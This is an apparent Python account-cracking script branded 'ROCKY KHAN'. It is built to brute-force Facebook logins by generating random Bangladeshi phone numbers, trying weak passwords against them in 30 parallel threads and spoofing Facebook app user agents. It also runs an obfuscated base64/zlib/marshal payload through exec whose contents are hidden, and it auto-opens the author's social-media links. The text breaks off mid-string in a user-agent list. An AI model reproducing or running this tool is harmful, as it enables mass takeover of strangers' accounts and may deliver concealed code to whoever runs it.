import marshal
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    import marshal, base64, zlib
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#---------MISSING-MODIUL---------#
#-------COLOR-CODE------#
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
M = '\x1b[38;5;208m'
R = '\033[31;1m'
RED = '\x1b[38;5;46m'
W = '\033[1;97m'
G = '\033[32;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
M = '\033[35;1m'
C = '\033[36;1m'
R = '\033[31;1m' 
LR = '\033[91;1m'
LG = '\033[92;1m'
LY = '\033[93;1m'
LB = '\033[94;1m'
LM = '\033[95;1m'
LC = '\033[96;1m'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
cokbrut=[]
ses=requests.Session()
uat = []
ugen = []
#--------USER-AGENTS------#
def uaa():
    android_versions = list(range(4, 13))
    samsung_models = ['Galaxy S6', 'Galaxy S7', 'Galaxy S8', 'Galaxy S9', 'Galaxy S10', 'Galaxy Note 5', 'Galaxy Note 8', 'Galaxy Note 9', 'Galaxy A5', 'Galaxy A7', 'Galaxy J5', 'Galaxy J7']
    huawei_models = ['P10', 'P20', 'P30', 'Mate 10', 'Mate 20', 'Y7', 'Y9', 'Nova 3i']
    xiaomi_models = ['Redmi Note 5', 'Redmi Note 6', 'Redmi Note 7', 'Redmi Note 8', 'Redmi Note 9', 'Mi A1', 'Mi A2', 'Mi 8', 'Mi 9', 'Poco F1']
    oppo_models = ['F7', 'F9', 'A3s', 'A5s', 'A7', 'A9', 'R11', 'R17', 'Reno 2', 'Reno 3']
    vivo_models = ['Y55', 'Y71', 'Y81', 'Y91', 'Y93', 'Y95', 'V9', 'V11', 'V15', 'S1']
    realme_models = ['C1', 'C2', '3 Pro', '5 Pro', 'X', 'X2']
    android_models = {
        'samsung': samsung_models,
        'huawei': huawei_models,
        'xiaomi': xiaomi_models,
        'oppo': oppo_models,
        'vivo': vivo_models,
        'realme': realme_models,
    }
    and_vers = random.choice(android_versions)
    brand = random.choice(list(android_models.keys()))
    and_mod = random.choice(android_models[brand])
    and_id = f'{random.randint(9,99)}.0.0.{random.randint(9,99)}{random.randint(9,99)}'
    app_uld = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    app_ver = f'{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}'
    app_vercode = str(random.randint(100000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {brand} {and_mod} Build/SKQ1.{app_uld}) [FBAN/EMA;FBLC/en_US;FBAV/{app_ver};FBBV/{app_vercode};FBDV/{and_mod};FBMD/{brand};FBSN/{and_id};FBPN/{pkg_name}]'
    return ua
ua = [
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/MessengerForiOS;FBAV/117.0.0.36.70;FBBV/57539258;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/2;FBCR/AT&amp;T;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]",
"Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6835 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.44.117;]",
"Mozilla/5.0 (Linux; Android 11; Infinix X675 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/437.0.0.35.116;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13C75 [FBAN/MessengerForiOS;FBAV/118.0.0.44.65;FBBV/58362889;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13C75 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2;FBSS/2;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/76.0.0.31.70;FBBV/32346928;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E233 [FBAN/MessengerForiOS;FBAV/66.0.0.26.68;FBBV/27396299;FBRV/0;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3;FBSS/3;FBCR/Koodo;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 [FBAN/MessengerForiOS;FBAV/83.0.0.25.68;FBBV/35718857;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.1;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/MessengerForiOS;FBAV/117.0.0.36.70;FBBV/57539258;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/2;FBCR/AT&amp;T;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G34 [FBAN/MessengerForiOS;FBAV/99.0.0.31.139;FBBV/45331829;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.3;FBSS/2;FBCR/IAM;FBID/phone;FBLC/fr_FR;FBOP/5]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/113.0.0.38.70;FBBV/54935425;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/Rogers;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]",
"Mozilla/5.0 (Linux; Android 4.4.2; 1201 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/128.0.0.21.88;]",
"Mozilla/5.0 (Linux; Android 5.0.1; SGH-I337M Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]",
"Mozilla/5.0 (Linux; Android 5.0.2; D6503 Build/23.1.A.1.28; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/120.0.0.14.84;]",
"Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 2 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]",
"Mozilla/5.0 (Linux; Android 5.0.2; SF1 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]",
"Mozilla/5.0 (Linux; Android 5.0.2; SM-A500H Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/124.0.0.43.69;]",
"Mozilla/5.0 (Linux; Android 5.0; LG-D855 Build/LRX21R.A1445306351; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/106.0.0.17.70;]",
"Mozilla/5.0 (Linux; Android 5.0; SM-N900L Build/LRX21V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]",
"Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]",
"Mozilla/5.0 (Linux; Android 5.1.1; F1w Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/126.0.0.9.84;]",
"Mozilla/5.0 (Linux; Android 5.1.1; F1w Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/127.0.0.18.81;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-G530AZ Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]",
    ]

ugen = ["Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"]
ugen = [ "Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]"]
ua = [" FBAN/FB4A;FBAV/8643.0.0.88.126;FBBV/63582484033;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/Greenberry 71606Y;FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.4,width=2874,height=2938};FB_FW/1",]
ua = [" FBAN/FB4A;FBAV/236.0.0.42.195;FBBV/38330549;FBDM/{density=5.8,width=875,height=1158};FBLC/en_GB;FBRV/48809099;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G981N;FBSV/8.5;FBOP/1;FBCA/arm64-v8a",]
ua = [" FBAN/FB4A;FBAV/242.0.0.43.119;FBBV/176515222;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/177156964;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",]
ua = [" [BAN/FB4A;FBAV/3631.0.0.211.9[FBAN/FB4A;FBAV/9775.0.0.88.260;FBBV/88889851481;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/AMD Radeon 46400I;FBSV/3;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.8,width=1023,height=3179};FB_FW/1",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10; Nokia 1.3 Build/QKQ1.191008.001) [FBAN/FBIOS;FBDV/Nokia6600;FBMD/Nokia;FBSN/IOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/MessengerForiOS;FBAV/117.0.0.36.70;FBBV/57539258;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/2;FBCR/AT&amp;T;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; Infinix X6835 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.44.117;]",]
ua = ["Mozilla/5.0 (Linux; Android 11; Infinix X675 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/437.0.0.35.116;]",]
nka = [
"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
]
logo= (""" \033[1;38m 

\033[38;5;38  _____  _    _ _____  _____   ____  
\033[38;5;39 |  __ \| |  | |  __ \|  __ \ / __ \ 
\033[38;5;40 | |__) | |  | | |  | | |__) | |  | |
\033[38;5;33 |  _  /| |  | | |  | |  _  /| |  | |
\033[38;5;37 | | \ \| |__| | |__| | | \ \| |__| |
\033[38;5;37 |_|  \_\\____/|_____/|_|  \_\\____/ 
                                     
  \033[0;101m🔥ROCKY KHAN IS ON FIRE🔥\033[0m
 \033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;35m 𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 \033[1;91m  : \033[1;97mROCKY KHAN
  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;35m 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊\033[1;91m     : \033[1;97mROCKY KHAN
  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;35m 𝐆𝐈𝐓𝐇𝐔𝐁\033[1;91m       : \033[1;97mRCN-rocky
  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;35m 𝐓𝐄𝐀𝐌\033[1;91m         : \033[1;97mRHC ROCKY KHAN
 \033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def Meta():
    os.system('clear');print(logo)
    print(f"  \033[1;91m[\033[1;92m1\033[1;91m]\033[1;35m WORKING RANDOM")
    print(f"  \033[1;91m[\033[1;92m2\033[1;91m]\033[1;35m JOIN MY TALIGRAM ")
    print(f"  \033[1;91m[\033[1;92m3\033[1;91m]\033[1;35m CONTACT TOOL ADMIN ")
    print(f"  \033[1;91m[\033[1;92mE\033[1;91m]\033[1;35m EXIT COMMAND ")
    print(' \033[1;92h━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    meta=input(f'  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;35m CHOICE \033[1;91m: \033[1;92m')
    if meta in ["1","01"]:
        meta1()
    if meta in ["2","02"]:
        os.system('xdg-open https://t.me/RICKY_KHAN1')
    if meta in ["3","03"]:
        os.system("xdg-open https://www.facebook.com/bhaghi.bangla?mibextid=2JQ9oc")
    if meta in ["E","e"]:
        os.system('exit')
   

def meta1():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear");print(logo)
    os.system('xdg-open https://www.facebook.com/bhaghi.bangla?mibextid=2JQ9oc/')
    print(f'  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;35m EXAMPLE \033[1;91m: \033[1;92m017\033[1;91m - \033[1;92m019\033[1;91m - \033[1;92m016\033[1;91m - \033[1;92m018 ')
    print(" \033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code = input(f'  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;35m INPUT SIM CODE \033[1;91m: \033[1;92m')
    doamin = ' BD Number id cloner [ONLY-OK] '
    cod ='+9163'
    os.system('clear');print(logo)
    os.system('xdg-open https://www.facebook.com/bhaghi.bangla?mibextid=2JQ9oc/')
    print(f'  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;92m EXAMPLE \033[1;91m: \033[1;92m2000\033[1;91m - \033[1;92m3000\033[1;91m - \033[1;92m4000\033[1;91m - \033[1;92m5000')
    print(" \033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input(f'  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;92m CRACK LIMIT \033[1;91m: \033[1;92m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as KING:
        os.system('clear');print(logo)
        tl = str(len(user))
        print(f'  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;91[\033[1;90-\033[1;91]\033[1;39m TOTAL ID     \033[1;91m :\033[1;92m '+tl)
        print(f'  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;91[\033[1;90-\033[1;91]\033[1;39m YOUR SIM CODE\033[1;91m :\033[1;92m '+code)
        print(f'  \033[1;91m[\033[1;92m®\033[1;91m]\033[1;91[\033[1;90-\033[1;91]\x1b[1;39m AROPLAN MOD \033[1;35m[\033[1;92mON\033[1;35m/\033[1;91mOF\033[1;35m] \033[1;38mFOR OK IDS')
        print(' \033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━') 
        exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJx1U01rG0cYntkP764+cOOkVp2k1LQpVJhIG33FCq5AjuW0+ZBJkxxscM1Gs7HWlbTqzgq3Yhe24INbVOqeGmgDOhkXFxp6aY5pfoEEOpQ9CYoPvam4B+NTZ1axLIE7s/PMzDvvvO8zz+z8BYYK87o/lAn8ABBAsARW+j1cgYjZAisMA1Rml6zvD7ZBsv4AhNm/6SRfGI4okMbSiAh6EaENEGNDxNoM4raACU9dNwZji9kl4/3BfAGM5rNZi10Aq9s2Z/Kn+82htBvsyajJgTOKxVjcLjnt/smJAeJH50lg82jMAj8CJDxj7TEkIkaDtoBEC5JeRJLFk14y/UNZxwbxxyzRkn7x7RIe+wMutu9/vYUzvP2IKg9GeUFQ8b8HrgHMbTJfsMtgE0KwTKwQNL5GgNyCP1+PpOLpWOyaHE+kb2SzuY/z6GoyLedupmbzs/dry5vFR/JH2aXyPflBGS/NYteXnE3JiXRavp6uC1GMCoqBCkM3A6jK50k7nAP0FteBBVanbGjB5lniUs4j9/dryILfM42LhB2ss5Hql2HoimoF4U3NLIYZl4nILnyC6Rmnp4/9C7l7S/npm8vzuU+OfXMlDZsFvVzN1EOPdTMyV9ILSglnIqcL42QfDhNwQCu42P92ss+zv9/+7faLWjuR6yRyxLStDFYPKSuXMR7XLxdNs4pvRKNKVYuYakldN5RyRDfWoyRZPRjFhOaCXqiV1YrpCoWiYq5pyBXRaxMhzyHFVFz+iVZScVhwGR27AqWGNMPl9KpacbmqYhZdbkPXKq5oqJ/XVGxiYtWxGQ64Ekm0ZuqfqRUjSFn5+/qveZskGnaNhnM5OjRE6sLWjJLL07wxgx7eeMOzrqvEixA2ccBT8rQYkudAMhnToP8o8XlIBesGP3Smuv6QE+qOv+Vc6nryPJv46WLzTntK7kzJZNoOLnaCi8QtONkDASblgfPwQPB/O9+49d3db+4+vdRE7cBMJzCz97AtxDpCrAd8bOq50hUyTa0lZPqfE3+pte6vtnKfvqh1pYmdWy3xspPo+i7sKNvvOMkD6Vzj7R3cvLD3qCXF21K8I8Wd+IFvonH1Kdt8f6/W8iXbvmTHl3QSvTdJfC+JB/9Q+BeM2M6Co6OjM809/uRcmP7nf4SycP4K/+oKN/+B9GoGEgyzxjkq9SQFKuLPwKCP2ZP2WJwr66hWUjPGu94bJfpeJ9BjIYR/AsnxaheMO17tiZOQZBtAAkDOYb/it3jHq17g/wD9IFSe'))))
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you']
            ids = code+love
            KING.submit(FIRE,ids,pwx,tl)
    print('    \033[1;91m[\033[1;92m®\033[1;91m]\033[1;91[\033[1;90-\033[1;91]\033[1;92m TOTAL OK ID \033[1;91m:  \033[1;92m'+str(len(oks)))
    
def FIRE(ids,pwv,tl):
    global loop,oks,cps,twf
    sys.stdout.write(f'\r\033[1;90m[\033[1;93mROCKY\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
    try:
        for pas in pwv:
            application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
            application_version_code=str(random.randint(000000000,999999999))
            fbs=random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
            gtt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
            gttt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
            android_version=str(random.randrange(6,13))
          #  ua_string = f'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW)","Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C)","Dalvik/2.1.0 (Linux; U; Android 13; OPD2203 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; LG-V607L Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 12; RC609L Build/ORB609L_V1.3.0_BTM-ST)","Dalvik/2.1.0 (Linux; U; Android 12; A201SH Build/S0020)","Dalvik/2.1.0 (Linux; U; Android 11; Infinix X663D Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; moto g(7) play Build/QPYS30.95-Q3-10-62-3-22)","Dalvik/2.1.0 (Linux; U; Android 9; AQUOS_TVE19A Build/PTMW.190511.139)","Dalvik/2.1.0 (Linux; U; Android 10.0; Note10+ Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 13; SM-M546B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTEAMR311 Build/NS6296)","Dalvik/2.1.0 (Linux; U; Android 12; H4113 Build/SQ3A.220705.004)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22i Build/SOWS32.121-40-2)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AEOCW Build/NS6505)","Dalvik/2.1.0 (Linux; U; Android 12; X55 Build/SP1A.210812.016)","Dalvik/1.4.0 (Linux; U; Android 2.3.5; HTC Desire HD A9191 Build/GRJ90)","Dalvik/2.1.0 (Linux; U; Android 11; M2004J19C Build/RP1A.200720.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 11; SM-A037G Build/RP1A.200720.012) VD/221","Dalvik/2.1.0 (Linux; U; Android 11; V2043_21 Build/RP1A.200720.012) VD/235","Dalvik/2.1.0 (Linux; U; Android 9; CPH2015 Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 10; STK-L21 Build/HUAWEISTK-L21) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; i14_Max Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; V2131 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; ONEPLUS A6013 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; F803YM Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; moto e20 